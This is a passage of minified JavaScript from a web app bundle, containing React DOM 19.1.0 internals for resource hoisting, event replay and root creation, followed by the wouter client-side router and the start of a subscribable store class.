a=e.nodeType;if(a===1||a===3)break;if(a===8){if(a=e.data,a==="$"||a==="$!"||a==="$?"||a==="F!"||a==="F")break;if(a==="/$")return null}}return e}var Al=null;function Eu(e){e=e.previousSibling;for(var a=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(a===0)return e;a--}else t==="/$"&&a++}e=e.previousSibling}return null}function Cu(e,a,t){switch(a=Qo(t),e){case"html":if(e=a.documentElement,!e)throw Error(m(452));return e;case"head":if(e=a.head,!e)throw Error(m(453));return e;case"body":if(e=a.body,!e)throw Error(m(454));return e;default:throw Error(m(451))}}function Ds(e){for(var a=e.attributes;a.length;)e.removeAttributeNode(a[0]);Ei(e)}var Aa=new Map,_u=new Set;function Yo(e){return typeof e.getRootNode=="function"?e.getRootNode():e.nodeType===9?e:e.ownerDocument}var $a=N.d;N.d={f:of,r:nf,D:lf,C:cf,L:df,m:mf,X:xf,S:uf,M:pf};function of(){var e=$a.f(),a=Uo();return e||a}function nf(e){var a=ot(e);a!==null&&a.tag===5&&a.type==="form"?Zd(a):$a.r(e)}var Pt=typeof document>"u"?null:document;function Mu(e,a,t){var s=Pt;if(s&&typeof a=="string"&&a){var o=fa(a);o='link[rel="'+e+'"][href="'+o+'"]',typeof t=="string"&&(o+='[crossorigin="'+t+'"]'),_u.has(o)||(_u.add(o),e={rel:e,crossOrigin:t,href:a},s.querySelector(o)===null&&(a=s.createElement("link"),Qe(a,"link",e),Ie(a),s.head.appendChild(a)))}}function lf(e){$a.D(e),Mu("dns-prefetch",e,null)}function cf(e,a){$a.C(e,a),Mu("preconnect",e,a)}function df(e,a,t){$a.L(e,a,t);var s=Pt;if(s&&e&&a){var o='link[rel="preload"][as="'+fa(a)+'"]';a==="image"&&t&&t.imageSrcSet?(o+='[imagesrcset="'+fa(t.imageSrcSet)+'"]',typeof t.imageSizes=="string"&&(o+='[imagesizes="'+fa(t.imageSizes)+'"]')):o+='[href="'+fa(e)+'"]';var n=o;switch(a){case"style":n=Ut(e);break;case"script":n=It(e)}Aa.has(n)||(e=D({rel:"preload",href:a==="image"&&t&&t.imageSrcSet?void 0:e,as:a},t),Aa.set(n,e),s.querySelector(o)!==null||a==="style"&&s.querySelector(Ts(n))||a==="script"&&s.querySelector(qs(n))||(a=s.createElement("link"),Qe(a,"link",e),Ie(a),s.head.appendChild(a)))}}function mf(e,a){$a.m(e,a);var t=Pt;if(t&&e){var s=a&&typeof a.as=="string"?a.as:"script",o='link[rel="modulepreload"][as="'+fa(s)+'"][href="'+fa(e)+'"]',n=o;switch(s){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":n=It(e)}if(!Aa.has(n)&&(e=D({rel:"modulepreload",href:e},a),Aa.set(n,e),t.querySelector(o)===null)){switch(s){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":if(t.querySelector(qs(n)))return}s=t.createElement("link"),Qe(s,"link",e),Ie(s),t.head.appendChild(s)}}}function uf(e,a,t){$a.S(e,a,t);var s=Pt;if(s&&e){var o=it(s).hoistableStyles,n=Ut(e);a=a||"default";var c=o.get(n);if(!c){var x={loading:0,preload:null};if(c=s.querySelector(Ts(n)))x.loading=5;else{e=D({rel:"stylesheet",href:e,"data-precedence":a},t),(t=Aa.get(n))&&Rl(e,t);var p=c=s.createElement("link");Ie(p),Qe(p,"link",e),p._p=new Promise(function(v,C){p.onload=v,p.onerror=C}),p.addEventListener("load",function(){x.loading|=1}),p.addEventListener("error",function(){x.loading|=2}),x.loading|=4,Ko(c,a,s)}c={type:"stylesheet",instance:c,count:1,state:x},o.set(n,c)}}}function xf(e,a){$a.X(e,a);var t=Pt;if(t&&e){var s=it(t).hoistableScripts,o=It(e),n=s.get(o);n||(n=t.querySelector(qs(o)),n||(e=D({src:e,async:!0},a),(a=Aa.get(o))&&El(e,a),n=t.createElement("script"),Ie(n),Qe(n,"link",e),t.head.appendChild(n)),n={type:"script",instance:n,count:1,state:null},s.set(o,n))}}function pf(e,a){$a.M(e,a);var t=Pt;if(t&&e){var s=it(t).hoistableScripts,o=It(e),n=s.get(o);n||(n=t.querySelector(qs(o)),n||(e=D({src:e,async:!0,type:"module"},a),(a=Aa.get(o))&&El(e,a),n=t.createElement("script"),Ie(n),Qe(n,"link",e),t.head.appendChild(n)),n={type:"script",instance:n,count:1,state:null},s.set(o,n))}}function Ou(e,a,t,s){var o=(o=Se.current)?Yo(o):null;if(!o)throw Error(m(446));switch(e){case"meta":case"title":return null;case"style":return typeof t.precedence=="string"&&typeof t.href=="string"?(a=Ut(t.href),t=it(o).hoistableStyles,s=t.get(a),s||(s={type:"style",instance:null,count:0,state:null},t.set(a,s)),s):{type:"void",instance:null,count:0,state:null};case"link":if(t.rel==="stylesheet"&&typeof t.href=="string"&&typeof t.precedence=="string"){e=Ut(t.href);var n=it(o).hoistableStyles,c=n.get(e);if(c||(o=o.ownerDocument||o,c={type:"stylesheet",instance:null,count:0,state:{loading:0,preload:null}},n.set(e,c),(n=o.querySelector(Ts(e)))&&!n._p&&(c.instance=n,c.state.loading=5),Aa.has(e)||(t={rel:"preload",as:"style",href:t.href,crossOrigin:t.crossOrigin,integrity:t.integrity,media:t.media,hrefLang:t.hrefLang,referrerPolicy:t.referrerPolicy},Aa.set(e,t),n||hf(o,e,t,c.state))),a&&s===null)throw Error(m(528,""));return c}if(a&&s!==null)throw Error(m(529,""));return null;case"script":return a=t.async,t=t.src,typeof t=="string"&&a&&typeof a!="function"&&typeof a!="symbol"?(a=It(t),t=it(o).hoistableScripts,s=t.get(a),s||(s={type:"script",instance:null,count:0,state:null},t.set(a,s)),s):{type:"void",instance:null,count:0,state:null};default:throw Error(m(444,e))}}function Ut(e){return'href="'+fa(e)+'"'}function Ts(e){return'link[rel="stylesheet"]['+e+"]"}function Du(e){return D({},e,{"data-precedence":e.precedence,precedence:null})}function hf(e,a,t,s){e.querySelector('link[rel="preload"][as="style"]['+a+"]")?s.loading=1:(a=e.createElement("link"),s.preload=a,a.addEventListener("load",function(){return s.loading|=1}),a.addEventListener("error",function(){return s.loading|=2}),Qe(a,"link",t),Ie(a),e.head.appendChild(a))}function It(e){return'[src="'+fa(e)+'"]'}function qs(e){return"script[async]"+e}function Tu(e,a,t){if(a.count++,a.instance===null)switch(a.type){case"style":var s=e.querySelector('style[data-href~="'+fa(t.href)+'"]');if(s)return a.instance=s,Ie(s),s;var o=D({},t,{"data-href":t.href,"data-precedence":t.precedence,href:null,precedence:null});return s=(e.ownerDocument||e).createElement("style"),Ie(s),Qe(s,"style",o),Ko(s,t.precedence,e),a.instance=s;case"stylesheet":o=Ut(t.href);var n=e.querySelector(Ts(o));if(n)return a.state.loading|=4,a.instance=n,Ie(n),n;s=Du(t),(o=Aa.get(o))&&Rl(s,o),n=(e.ownerDocument||e).createElement("link"),Ie(n);var c=n;return c._p=new Promise(function(x,p){c.onload=x,c.onerror=p}),Qe(n,"link",s),a.state.loading|=4,Ko(n,t.precedence,e),a.instance=n;case"script":return n=It(t.src),(o=e.querySelector(qs(n)))?(a.instance=o,Ie(o),o):(s=t,(o=Aa.get(n))&&(s=D({},t),El(s,o)),e=e.ownerDocument||e,o=e.createElement("script"),Ie(o),Qe(o,"link",s),e.head.appendChild(o),a.instance=o);case"void":return null;default:throw Error(m(443,a.type))}else a.type==="stylesheet"&&(a.state.loading&4)===0&&(s=a.instance,a.state.loading|=4,Ko(s,t.precedence,e));return a.instance}function Ko(e,a,t){for(var s=t.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'),o=s.length?s[s.length-1]:null,n=o,c=0;c<s.length;c++){var x=s[c];if(x.dataset.precedence===a)n=x;else if(n!==o)break}n?n.parentNode.insertBefore(e,n.nextSibling):(a=t.nodeType===9?t.head:t,a.insertBefore(e,a.firstChild))}function Rl(e,a){e.crossOrigin==null&&(e.crossOrigin=a.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=a.referrerPolicy),e.title==null&&(e.title=a.title)}function El(e,a){e.crossOrigin==null&&(e.crossOrigin=a.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=a.referrerPolicy),e.integrity==null&&(e.integrity=a.integrity)}var Wo=null;function qu(e,a,t){if(Wo===null){var s=new Map,o=Wo=new Map;o.set(t,s)}else o=Wo,s=o.get(t),s||(s=new Map,o.set(t,s));if(s.has(e))return s;for(s.set(e,null),t=t.getElementsByTagName(e),o=0;o<t.length;o++){var n=t[o];if(!(n[Vt]||n[Ke]||e==="link"&&n.getAttribute("rel")==="stylesheet")&&n.namespaceURI!=="http://www.w3.org/2000/svg"){var c=n.getAttribute(a)||"";c=e+c;var x=s.get(c);x?x.push(n):s.set(c,[n])}}return s}function Nu(e,a,t){e=e.ownerDocument||e,e.head.insertBefore(t,a==="title"?e.querySelector("head > title"):null)}function ff(e,a,t){if(t===1||a.itemProp!=null)return!1;switch(e){case"meta":case"title":return!0;case"style":if(typeof a.precedence!="string"||typeof a.href!="string"||a.href==="")break;return!0;case"link":if(typeof a.rel!="string"||typeof a.href!="string"||a.href===""||a.onLoad||a.onError)break;return a.rel==="stylesheet"?(e=a.disabled,typeof a.precedence=="string"&&e==null):!0;case"script":if(a.async&&typeof a.async!="function"&&typeof a.async!="symbol"&&!a.onLoad&&!a.onError&&a.src&&typeof a.src=="string")return!0}return!1}function Lu(e){return!(e.type==="stylesheet"&&(e.state.loading&3)===0)}var Ns=null;function bf(){}function gf(e,a,t){if(Ns===null)throw Error(m(475));var s=Ns;if(a.type==="stylesheet"&&(typeof t.media!="string"||matchMedia(t.media).matches!==!1)&&(a.state.loading&4)===0){if(a.instance===null){var o=Ut(t.href),n=e.querySelector(Ts(o));if(n){e=n._p,e!==null&&typeof e=="object"&&typeof e.then=="function"&&(s.count++,s=Jo.bind(s),e.then(s,s)),a.state.loading|=4,a.instance=n,Ie(n);return}n=e.ownerDocument||e,t=Du(t),(o=Aa.get(o))&&Rl(t,o),n=n.createElement("link"),Ie(n);var c=n;c._p=new Promise(function(x,p){c.onload=x,c.onerror=p}),Qe(n,"link",t),a.instance=n}s.stylesheets===null&&(s.stylesheets=new Map),s.stylesheets.set(a,e),(e=a.state.preload)&&(a.state.loading&3)===0&&(s.count++,a=Jo.bind(s),e.addEventListener("load",a),e.addEventListener("error",a))}}function vf(){if(Ns===null)throw Error(m(475));var e=Ns;return e.stylesheets&&e.count===0&&Cl(e,e.stylesheets),0<e.count?function(a){var t=setTimeout(function(){if(e.stylesheets&&Cl(e,e.stylesheets),e.unsuspend){var s=e.unsuspend;e.unsuspend=null,s()}},6e4);return e.unsuspend=a,function(){e.unsuspend=null,clearTimeout(t)}}:null}function Jo(){if(this.count--,this.count===0){if(this.stylesheets)Cl(this,this.stylesheets);else if(this.unsuspend){var e=this.unsuspend;this.unsuspend=null,e()}}}var $o=null;function Cl(e,a){e.stylesheets=null,e.unsuspend!==null&&(e.count++,$o=new Map,a.forEach(jf,e),$o=null,Jo.call(e))}function jf(e,a){if(!(a.state.loading&4)){var t=$o.get(e);if(t)var s=t.get(null);else{t=new Map,$o.set(e,t);for(var o=e.querySelectorAll("link[data-precedence],style[data-precedence]"),n=0;n<o.length;n++){var c=o[n];(c.nodeName==="LINK"||c.getAttribute("media")!=="not all")&&(t.set(c.dataset.precedence,c),s=c)}s&&t.set(null,s)}o=a.instance,c=o.getAttribute("data-precedence"),n=t.get(c)||s,n===s&&t.set(null,o),t.set(c,o),this.count++,s=Jo.bind(this),o.addEventListener("load",s),o.addEventListener("error",s),n?n.parentNode.insertBefore(o,n.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(o,e.firstChild)),a.state.loading|=4}}var Ls={$$typeof:ye,Provider:null,Consumer:null,_currentValue:H,_currentValue2:H,_threadCount:0};function yf(e,a,t,s,o,n,c,x){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=yi(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=yi(0),this.hiddenUpdates=yi(null),this.identifierPrefix=s,this.onUncaughtError=o,this.onCaughtError=n,this.onRecoverableError=c,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=x,this.incompleteTransitions=new Map}function zu(e,a,t,s,o,n,c,x,p,v,C,M){return e=new yf(e,a,t,c,x,p,v,M),a=1,n===!0&&(a|=24),n=ca(3,null,null,a),e.current=n,n.stateNode=e,a=nn(),a.refCount++,e.pooledCache=a,a.refCount++,n.memoizedState={element:s,isDehydrated:t,cache:a},mn(n),e}function wu(e){return e?(e=gt,e):gt}function Xu(e,a,t,s,o,n){o=wu(o),s.context===null?s.context=o:s.pendingContext=o,s=cr(a),s.payload={element:t},n=n===void 0?null:n,n!==null&&(s.callback=n),t=dr(e,s,a),t!==null&&(pa(t,e,a),ds(t,e,a))}function Bu(e,a){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<a?t:a}}function _l(e,a){Bu(e,a),(e=e.alternate)&&Bu(e,a)}function Pu(e){if(e.tag===13){var a=bt(e,67108864);a!==null&&pa(a,e,67108864),_l(e,67108864)}}var ei=!0;function Sf(e,a,t,s){var o=E.T;E.T=null;var n=N.p;try{N.p=2,Ml(e,a,t,s)}finally{N.p=n,E.T=o}}function Af(e,a,t,s){var o=E.T;E.T=null;var n=N.p;try{N.p=8,Ml(e,a,t,s)}finally{N.p=n,E.T=o}}function Ml(e,a,t,s){if(ei){var o=Ol(s);if(o===null)hl(e,a,s,ai,t),Iu(e,s);else if(Ef(o,e,a,t,s))s.stopPropagation();else if(Iu(e,s),a&4&&-1<Rf.indexOf(e)){for(;o!==null;){var n=ot(o);if(n!==null)switch(n.tag){case 3:if(n=n.stateNode,n.current.memoizedState.isDehydrated){var c=zr(n.pendingLanes);if(c!==0){var x=n;for(x.pendingLanes|=2,x.entangledLanes|=2;c;){var p=1<<31-na(c);x.entanglements[1]|=p,c&=~p}Na(n),(de&6)===0&&(Bo=Ma()+500,_s(0))}}break;case 13:x=bt(n,2),x!==null&&pa(x,n,2),Uo(),_l(n,2)}if(n=Ol(s),n===null&&hl(e,a,s,ai,t),n===o)break;o=n}o!==null&&s.stopPropagation()}else hl(e,a,s,null,t)}}function Ol(e){return e=Ni(e),Dl(e)}var ai=null;function Dl(e){if(ai=null,e=st(e),e!==null){var a=j(e);if(a===null)e=null;else{var t=a.tag;if(t===13){if(e=A(a),e!==null)return e;e=null}else if(t===3){if(a.stateNode.current.memoizedState.isDehydrated)return a.tag===3?a.stateNode.containerInfo:null;e=null}else a!==e&&(e=null)}}return ai=e,null}function Uu(e){switch(e){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(lp()){case ec:return 2;case ac:return 8;case Hs:case cp:return 32;case rc:return 268435456;default:return 32}default:return 32}}var Tl=!1,Ar=null,Rr=null,Er=null,zs=new Map,ws=new Map,Cr=[],Rf="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function Iu(e,a){switch(e){case"focusin":case"focusout":Ar=null;break;case"dragenter":case"dragleave":Rr=null;break;case"mouseover":case"mouseout":Er=null;break;case"pointerover":case"pointerout":zs.delete(a.pointerId);break;case"gotpointercapture":case"lostpointercapture":ws.delete(a.pointerId)}}function Xs(e,a,t,s,o,n){return e===null||e.nativeEvent!==n?(e={blockedOn:a,domEventName:t,eventSystemFlags:s,nativeEvent:n,targetContainers:[o]},a!==null&&(a=ot(a),a!==null&&Pu(a)),e):(e.eventSystemFlags|=s,a=e.targetContainers,o!==null&&a.indexOf(o)===-1&&a.push(o),e)}function Ef(e,a,t,s,o){switch(a){case"focusin":return Ar=Xs(Ar,e,a,t,s,o),!0;case"dragenter":return Rr=Xs(Rr,e,a,t,s,o),!0;case"mouseover":return Er=Xs(Er,e,a,t,s,o),!0;case"pointerover":var n=o.pointerId;return zs.set(n,Xs(zs.get(n)||null,e,a,t,s,o)),!0;case"gotpointercapture":return n=o.pointerId,ws.set(n,Xs(ws.get(n)||null,e,a,t,s,o)),!0}return!1}function ku(e){var a=st(e.target);if(a!==null){var t=j(a);if(t!==null){if(a=t.tag,a===13){if(a=A(t),a!==null){e.blockedOn=a,bp(e.priority,function(){if(t.tag===13){var s=xa();s=Si(s);var o=bt(t,s);o!==null&&pa(o,t,s),_l(t,s)}});return}}else if(a===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function ri(e){if(e.blockedOn!==null)return!1;for(var a=e.targetContainers;0<a.length;){var t=Ol(e.nativeEvent);if(t===null){t=e.nativeEvent;var s=new t.constructor(t.type,t);qi=s,t.target.dispatchEvent(s),qi=null}else return a=ot(t),a!==null&&Pu(a),e.blockedOn=t,!1;a.shift()}return!0}function Fu(e,a,t){ri(e)&&t.delete(a)}function Cf(){Tl=!1,Ar!==null&&ri(Ar)&&(Ar=null),Rr!==null&&ri(Rr)&&(Rr=null),Er!==null&&ri(Er)&&(Er=null),zs.forEach(Fu),ws.forEach(Fu)}function ti(e,a){e.blockedOn===a&&(e.blockedOn=null,Tl||(Tl=!0,i.unstable_scheduleCallback(i.unstable_NormalPriority,Cf)))}var si=null;function Gu(e){si!==e&&(si=e,i.unstable_scheduleCallback(i.unstable_NormalPriority,function(){si===e&&(si=null);for(var a=0;a<e.length;a+=3){var t=e[a],s=e[a+1],o=e[a+2];if(typeof s!="function"){if(Dl(s||t)===null)continue;break}var n=ot(t);n!==null&&(e.splice(a,3),a-=3,Dn(n,{pending:!0,data:o,method:t.method,action:s},s,o))}}))}function Bs(e){function a(p){return ti(p,e)}Ar!==null&&ti(Ar,e),Rr!==null&&ti(Rr,e),Er!==null&&ti(Er,e),zs.forEach(a),ws.forEach(a);for(var t=0;t<Cr.length;t++){var s=Cr[t];s.blockedOn===e&&(s.blockedOn=null)}for(;0<Cr.length&&(t=Cr[0],t.blockedOn===null);)ku(t),t.blockedOn===null&&Cr.shift();if(t=(e.ownerDocument||e).$$reactFormReplay,t!=null)for(s=0;s<t.length;s+=3){var o=t[s],n=t[s+1],c=o[aa]||null;if(typeof n=="function")c||Gu(t);else if(c){var x=null;if(n&&n.hasAttribute("formAction")){if(o=n,c=n[aa]||null)x=c.formAction;else if(Dl(o)!==null)continue}else x=c.action;typeof x=="function"?t[s+1]=x:(t.splice(s,3),s-=3),Gu(t)}}}function ql(e){this._internalRoot=e}oi.prototype.render=ql.prototype.render=function(e){var a=this._internalRoot;if(a===null)throw Error(m(409));var t=a.current,s=xa();Xu(t,s,e,a,null,null)},oi.prototype.unmount=ql.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var a=e.containerInfo;Xu(e.current,2,null,e,null,null),Uo(),a[tt]=null}};function oi(e){this._internalRoot=e}oi.prototype.unstable_scheduleHydration=function(e){if(e){var a=nc();e={blockedOn:null,target:e,priority:a};for(var t=0;t<Cr.length&&a!==0&&a<Cr[t].priority;t++);Cr.splice(t,0,e),t===0&&ku(e)}};var Vu=l.version;if(Vu!=="19.1.0")throw Error(m(527,Vu,"19.1.0"));N.findDOMNode=function(e){var a=e._reactInternals;if(a===void 0)throw typeof e.render=="function"?Error(m(188)):(e=Object.keys(e).join(","),Error(m(268,e)));return e=O(a),e=e!==null?w(e):null,e=e===null?null:e.stateNode,e};var _f={bundleType:0,version:"19.1.0",rendererPackageName:"react-dom",currentDispatcherRef:E,reconcilerVersion:"19.1.0"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var ii=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!ii.isDisabled&&ii.supportsFiber)try{kt=ii.inject(_f),ia=ii}catch{}}return Ps.createRoot=function(e,a){if(!f(e))throw Error(m(299));var t=!1,s="",o=nm,n=lm,c=cm,x=null;return a!=null&&(a.unstable_strictMode===!0&&(t=!0),a.identifierPrefix!==void 0&&(s=a.identifierPrefix),a.onUncaughtError!==void 0&&(o=a.onUncaughtError),a.onCaughtError!==void 0&&(n=a.onCaughtError),a.onRecoverableError!==void 0&&(c=a.onRecoverableError),a.unstable_transitionCallbacks!==void 0&&(x=a.unstable_transitionCallbacks)),a=zu(e,1,!1,null,null,t,s,o,n,c,x,null),e[tt]=a.current,pl(e),new ql(a)},Ps.hydrateRoot=function(e,a,t){if(!f(e))throw Error(m(299));var s=!1,o="",n=nm,c=lm,x=cm,p=null,v=null;return t!=null&&(t.unstable_strictMode===!0&&(s=!0),t.identifierPrefix!==void 0&&(o=t.identifierPrefix),t.onUncaughtError!==void 0&&(n=t.onUncaughtError),t.onCaughtError!==void 0&&(c=t.onCaughtError),t.onRecoverableError!==void 0&&(x=t.onRecoverableError),t.unstable_transitionCallbacks!==void 0&&(p=t.unstable_transitionCallbacks),t.formState!==void 0&&(v=t.formState)),a=zu(e,1,!0,a,t??null,s,o,n,c,x,p,v),a.context=wu(null),t=a.current,s=xa(),s=Si(s),o=cr(s),o.callback=null,dr(t,o,s),t=s,a.current.lanes=t,Gt(a,t),Na(a),e[tt]=a.current,pl(e),new oi(a)},Ps.version="19.1.0",Ps}var Yu;function zf(){if(Yu)return Nl.exports;Yu=1;function i(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(i)}catch(l){console.error(l)}}return i(),Nl.exports=Lf(),Nl.exports}var wf=zf();function Xf(i,l){if(i instanceof RegExp)return{keys:!1,pattern:i};var u,m,f,j,A=[],R="",O=i.split("/");for(O[0]||O.shift();f=O.shift();)u=f[0],u==="*"?(A.push(u),R+=f[1]==="?"?"(?:/(.*))?":"/(.*)"):u===":"?(m=f.indexOf("?",1),j=f.indexOf(".",1),A.push(f.substring(1,~m?m:~j?j:f.length)),R+=~m&&!~j?"(?:/([^/]+?))?":"/([^/]+?)",~j&&(R+=(~m?"?":"")+"\\"+f.substring(j))):R+="/"+f;return{keys:A,pattern:new RegExp("^"+R+(l?"(?=$|/)":"/?$"),"i")}}var wl={exports:{}},Xl={};var Ku;function Bf(){if(Ku)return Xl;Ku=1;var i=jx();function l(k,U){return k===U&&(k!==0||1/k===1/U)||k!==k&&U!==U}var u=typeof Object.is=="function"?Object.is:l,m=i.useState,f=i.useEffect,j=i.useLayoutEffect,A=i.useDebugValue;function R(k,U){var $=U(),Y=m({inst:{value:$,getSnapshot:U}}),G=Y[0].inst,K=Y[1];return j(function(){G.value=$,G.getSnapshot=U,O(G)&&K({inst:G})},[k,$,U]),f(function(){return O(G)&&K({inst:G}),k(function(){O(G)&&K({inst:G})})},[k]),A($),$}function O(k){var U=k.getSnapshot;k=k.value;try{var $=U();return!u(k,$)}catch{return!0}}function w(k,U){return U()}var D=typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"?w:R;return Xl.useSyncExternalStore=i.useSyncExternalStore!==void 0?i.useSyncExternalStore:D,Xl}var Wu;function Pf(){return Wu||(Wu=1,wl.exports=Bf()),wl.exports}var yx=Pf();const Uf=Of.useInsertionEffect,If=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",kf=If?se.useLayoutEffect:se.useEffect,Ff=Uf||kf,Sx=i=>{const l=se.useRef([i,(...u)=>l[0](...u)]).current;return Ff(()=>{l[0]=i}),l[1]},Gf="popstate",Vl="pushState",Hl="replaceState",Vf="hashchange",Ju=[Gf,Vl,Hl,Vf],Hf=i=>{for(const l of Ju)addEventListener(l,i);return()=>{for(const l of Ju)removeEventListener(l,i)}},Ax=(i,l)=>yx.useSyncExternalStore(Hf,i,l),$u=()=>location.search,Zf=({ssrSearch:i}={})=>Ax($u,i!=null?()=>i:$u),ex=()=>location.pathname,Qf=({ssrPath:i}={})=>Ax(ex,i!=null?()=>i:ex),Yf=(i,{replace:l=!1,state:u=null}={})=>history[l?Hl:Vl](u,"",i),Kf=(i={})=>[Qf(i),Yf],ax=Symbol.for("wouter_v3");if(typeof history<"u"&&typeof window[ax]>"u"){for(const i of[Vl,Hl]){const l=history[i];history[i]=function(){const u=l.apply(this,arguments),m=new Event(i);return m.arguments=arguments,dispatchEvent(m),u}}Object.defineProperty(window,ax,{value:!0})}const Wf=(i,l)=>l.toLowerCase().indexOf(i.toLowerCase())?"~"+l:l.slice(i.length)||"/",Rx=(i="")=>i==="/"?"":i,Jf=(i,l)=>i[0]==="~"?i.slice(1):Rx(l)+i,$f=(i="",l)=>Wf(rx(Rx(i)),rx(l)),rx=i=>{try{return decodeURI(i)}catch{return i}},Ex={hook:Kf,searchHook:Zf,parser:Xf,base:"",ssrPath:void 0,ssrSearch:void 0,ssrContext:void 0,hrefs:i=>i,aroundNav:(i,l,u)=>i(l,u)},Cx=se.createContext(Ex),bi=()=>se.useContext(Cx),_x={},Mx=se.createContext(_x),e0=()=>se.useContext(Mx),Zl=i=>{const[l,u]=i.hook(i);return[$f(i.base,l),Sx((m,f)=>i.aroundNav(u,Jf(m,i.base),f))]},Ox=(i,l,u,m)=>{const{pattern:f,keys:j}=l instanceof RegExp?{keys:!1,pattern:l}:i(l||"*",m),A=f.exec(u)||[],[R,...O]=A;return R!==void 0?[!0,(()=>{const w=j!==!1?Object.fromEntries(j.map((k,U)=>[k,O[U]])):A.groups;let D={...O};return w&&Object.assign(D,w),D})(),...m?[R]:[]]:[!1,null]},Dx=({children:i,...l})=>{const u=bi(),m=l.hook?Ex:u;let f=m;const[j,A=l.ssrSearch??""]=l.ssrPath?.split("?")??[];j&&(l.ssrSearch=A,l.ssrPath=j),l.hrefs=l.hrefs??l.hook?.hrefs,l.searchHook=l.searchHook??l.hook?.searchHook;let R=se.useRef({}),O=R.current,w=O;for(let D in m){const k=D==="base"?m[D]+(l[D]??""):l[D]??m[D];O===w&&k!==w[D]&&(R.current=w={...w}),w[D]=k,(k!==m[D]||k!==f[D])&&(f=w)}return se.createElement(Cx.Provider,{value:f,children:i})},tx=({children:i,component:l},u)=>l?se.createElement(l,{params:u}):typeof i=="function"?i(u):i,a0=i=>{let l=se.useRef(_x);const u=l.current;return l.current=Object.keys(i).length!==Object.keys(u).length||Object.entries(i).some(([m,f])=>f!==u[m])?i:u},q=({path:i,nest:l,match:u,...m})=>{const f=bi(),[j]=Zl(f),[A,R,O]=u??Ox(f.parser,i,j,l),w=a0({...e0(),...R});if(!A)return null;const D=O?se.createElement(Dx,{base:O},tx(m,w)):tx(m,w);return se.createElement(Mx.Provider,{value:w,children:D})},La=se.forwardRef((i,l)=>{const u=bi(),[m,f]=Zl(u),{to:j="",href:A=j,onClick:R,asChild:O,children:w,className:D,replace:k,state:U,transition:$,...Y}=i,G=Sx(oe=>{oe.ctrlKey||oe.metaKey||oe.altKey||oe.shiftKey||oe.button!==0||(R?.(oe),oe.defaultPrevented||(oe.preventDefault(),f(A,i)))}),K=u.hrefs(A[0]==="~"?A.slice(1):u.base+A,u);return O&&se.isValidElement(w)?se.cloneElement(w,{onClick:G,href:K}):se.createElement("a",{...Y,onClick:G,href:K,className:D?.call?D(m===A):D,children:w,ref:l})}),Tx=i=>Array.isArray(i)?i.flatMap(l=>Tx(l&&l.type===se.Fragment?l.props.children:l)):[i],r0=({children:i,location:l})=>{const u=bi(),[m]=Zl(u);for(const f of Tx(i)){let j=0;if(se.isValidElement(f)&&(j=Ox(u.parser,f.props.path,l||m,f.props.nest))[0])return se.cloneElement(f,{match:j})}return null},Is={v:[]},sx=()=>Is.v.forEach(i=>i()),t0=i=>(Is.v.push(i)===1&&addEventListener("hashchange",sx),()=>{Is.v=Is.v.filter(l=>l!==i),Is.v.length||removeEventListener("hashchange",sx)}),s0=()=>"/"+location.hash.replace(/^#?\/?/,""),o0=(i,{state:l=null,replace:u=!1}={})=>{const m=location.href,[f,j]=i.replace(/^#?\/?/,"").split("?"),A=new URL(location.href);A.hash=`/${f}`,j&&(A.search=j);const R=A.href;u?history.replaceState(l,"",R):history.pushState(l,"",R);const O=typeof HashChangeEvent<"u"?new HashChangeEvent("hashchange",{oldURL:m,newURL:R}):new Event("hashchange",{detail:{oldURL:m,newURL:R}});dispatchEvent(O)},gi=({ssrPath:i="/"}={})=>[yx.useSyncExternalStore(t0,s0,()=>i),o0];gi.hrefs=i=>"#"+i;var vi=class{constructor(){this.listeners=new Set,this.subscribe=this.subscribe.bind(this)}subscribe(i){return this.listeners.add(i),this.onSubscribe(),()=>{this.listeners.delete(i),this.onUnsubscribe()}}hasListeners(){return 